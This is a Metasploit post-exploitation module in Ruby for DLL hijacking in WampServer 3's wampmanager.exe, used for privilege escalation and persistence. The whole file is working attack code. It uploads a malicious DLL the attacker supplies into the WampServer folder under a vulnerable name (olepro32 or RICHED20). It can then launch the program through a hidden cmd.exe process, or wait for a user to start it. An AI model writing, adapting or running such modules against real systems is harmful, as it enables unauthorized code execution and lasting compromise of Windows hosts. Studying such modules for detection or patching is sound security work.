##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Post

  include Post::File
  include Post::Common
  
  def initialize(info={})
    super(update_info(info,
        'Name'          => 'WampServer 3 Dll hijacking (PrivEsc & Persistence)',
        'Description'   => %q{
          This module exploits a dll hijacking in WampServer 3 (wampmanager.exe)
        },
        'License'       => MSF_LICENSE,
        'Author'        => [ 'Vasilis ' ],
        'Platform'      => [ 'win' ],
        'SessionTypes'  => [ 'meterpreter', 'shell' ]
    ))
	  register_options([	    
	  OptString.new('PATH', [true, 'Malicious dll local location']),
	  OptEnum.new('MODE', [true, 'Silent mode', 'ON', %w(OFF ON)]),	  
	  OptEnum.new('DLLNAME', [true, 'Choose Vulnerable dll name', 'olepro32', %w(RICHED20 olepro32)])
    ])
  end
 
  def run 
	print_status("Connecting to the session...")
	begin
	if file?("c:\\wamp64\\wampmanager.exe") 
		print_status("Wampmanager Exist on c:\\wamp64")
		print_status ("Uploading malicious dll...")
		uploadll()
		silentmode()
	else
		abort()
	end 
	rescue ::Exception => e
         print_error("Can't find Wampmanager on c:\\wamp64 #{e}")
    end
  end
  
  def uploadll()
	begin
		case datastore['DLLNAME']
		when 'olepro32'		  
		  upload_file("c:\\wamp64\\olepro32.dll", datastore['PATH']) 
		  print_status ("olepro32.dll uploaded successfully")
		when 'RICHED20'
		  upload_file("c:\\wamp64\\RICHED20.DLL", datastore['PATH']) 
		  print_status ("RICHED20.DLL uploaded successfully")	
		end
	rescue ::Exception => e
	  print_error("Error uploading dll, maybe permission denied #{e}")
    end
	
  end
  
  def silentmode()
	begin
		case datastore['MODE']
		when 'ON'
		  print_status ("Silent MODE ON... Waiting user run wampmanager manually")
		when 'OFF'
		  print_status ("Silent MODE OFF... Executing wampmanager")
		  commands = ["C:\\wamp64\\wampmanager.exe"]
		  list_exec(client,commands)
        end
	rescue ::Exception => e
	  print_error("Error executing wampmanager #{e}")
    end
  end
   
  def list_exec(session,cmdlst)    
	r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "Running executable #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
          while(d = r.channel.read)
              print_status("t#{d}")
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
  end 
end
